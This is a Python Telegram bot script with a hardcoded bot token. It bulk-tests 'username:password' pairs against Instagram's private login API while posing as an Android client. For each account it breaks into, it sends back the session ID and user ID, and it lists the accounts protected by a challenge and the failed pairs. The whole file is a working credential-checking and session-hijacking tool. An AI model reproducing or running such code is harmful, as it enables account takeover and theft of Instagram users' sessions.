import requests
import uuid
from uuid import uuid4
import telebot
#token = input("[!] Enter Token :")
token = "5065353593:AAE6RJkAhtB0PZ-V45cYmuzsWxBkZ0vNZyc"
bot = telebot.TeleBot(token)
url = 'https://i.instagram.com/api/v1/accounts/login/'
headers = {'User-Agent': 'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)',
        'Accept': "*/*",
        'Cookie': 'missing',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'en-US',
        'X-IG-Capabilities': '3brTvw==',
        'X-IG-Connection-Type': 'WIFI',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'Host': 'i.instagram.com'}
@bot.message_handler(commands=["start"])
def login(message):
    bot.send_message(message.chat.id,f"<strong>Hi ,\n== === ==\nWellcome to Login Instagram Bot\nSend User:pass Now !\n== === ==\nBy : @ALSH_3K</strong>",parse_mode="html")
@bot.message_handler(func=lambda message:True)
def loginNow(message):
    msg = message.text
    bot.send_message(message.chat.id,"Wait ..")
    exmsg = msg.split("\n")
    num = 1
    for i in exmsg:
	    username = i.split(":")[0]
	    password = i.split(":")[1]
	    uid = str(uuid4())
	    data = {
	        "password":password,
	        "username":username,
	        "device_id":uid,
	        "from_req":"false",
	        '_csrftoken': 'missing',
	        'login_attempt_countn': '0'
	    }
	    req = requests.post(url,headers=headers,data=data)
	    if 'logged_in' in req.text:
	        coc = req.cookies
	        print(f"""\n{coc}\n""")
	        id = coc["ds_user_id"]
	        ses = coc["sessionid"]
	        bot.send_message(message.chat.id,f"<strong>Done Login Sir ⚠️ .\nSession Id : {ses}\nID : {id}</strong>",parse_mode="html")
	    if 'challenge_required' in req.text:
	        bot.send_message(message.chat.id, f"<strong>{num} - Done Login Sir ✅, But Secureid Account <code>{username}:{password}</code></strong>", parse_mode="html")
	    if "bad_password" in req.text:
	        bot.send_message(message.chat.id,f"<strong>{num} - Error Login Sir ❌ <code>{username}:{password}</code></strong>",parse_mode="html")
	    num += 1
bot.polling()
